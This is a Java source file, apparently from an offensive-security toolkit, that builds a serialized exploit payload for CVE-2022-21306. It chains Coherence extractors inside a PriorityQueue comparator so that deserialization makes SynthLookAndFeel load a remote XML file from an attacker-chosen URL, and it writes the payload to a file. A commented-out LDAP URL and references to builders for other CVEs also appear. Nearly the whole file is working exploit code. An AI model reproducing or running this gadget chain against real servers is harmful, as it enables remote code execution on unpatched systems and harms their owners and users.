package com._51pwn.CVE_2022_21306;

import com._51pwn.Tools;
import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import javax.swing.plaf.synth.SynthLookAndFeel;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

// CVE-2022-21306
/*
<synth>
  <style id="button">
    <font name="Monospaced" size="24" style="BOLD"/>
    <state value="MOUSE_OVER">
      <font name="SansSerif" size="48" style="ITALIC"/>
      <opaque value="TRUE"/>
      <color value="BLUE" type="BACKGROUND"/>
    </state>
    <state value="PRESSED">
      <font name="Serif" size="36" style="BOLD AND ITALIC"/>
      <opaque value="TRUE"/>
      <color value="RED" type="BACKGROUND"/>
    </state>
  </style>
  <bind style="button" type="region" key="Button"/>
  <style id="textfield">
     <opaque value="true"/>
     <state>
        <color value="#C2E2CF" type="BACKGROUND"/>
        <color value="#000000" type="TEXT_FOREGROUND"/>
     </state>
     <imagePainter method="textFieldBorder" path="text.png"
        sourceInsets="3 3 3 3" paintCenter="false"/>
     <insets top="3" left="3" bottom="3" right="3"/>
  </style>
  <bind style="textfield" type="region" key="TextField"/>
</synth>
* */
public class Main {
    public static void main(String[] args) throws Exception {
        System.setProperty("sun.io.serialization.extendedDebugInfo", "false");
        System.setProperty("sun.io.serialization.extendedDebugInfo", "true");

        SynthLookAndFeel laf = new SynthLookAndFeel();
        String ldap = "http://docker.for.mac.localhost:8888/ldxml.xml";//args[0];//"ldap://docker.for.mac.localhost:1389/UpX34defineClass";
        // docker.for.mac.localhost
        System.out.println(ldap);
        java.net.URL x01 = new java.net.URL(ldap);
        // 未后续 操作 方法 getDatabaseMetaData 进行定义
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(javax.swing.plaf.synth.SynthLookAndFeel.class),
                new ReflectionExtractor("newInstance", new Object[0]),
                new ReflectionExtractor("load",new Object[]{x01})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);

        Tools.WtOo1(priorityQueue);

        System.out.println("write ok， test start　... ");
        // 测试
//        testRead();
//        System.getProperties().put("jarName","CVE_2021_2394_PowerBy_51pwn.jar");
//        com._51pwn.hktalent.CreatJar.main(args);
//        System.getProperties().put("jarName","CVE-2022-21350_powerBy_51pwn.jar");
//        com._51pwn.hktalent.CreatJar.main(args);
    }

    public static void testRead() throws Exception {
        FileInputStream fis = new FileInputStream(new File("CVE_2022_21306.dat"));
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.flush();
            os.close();
            System.out.println("ok: test.ser");
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }
}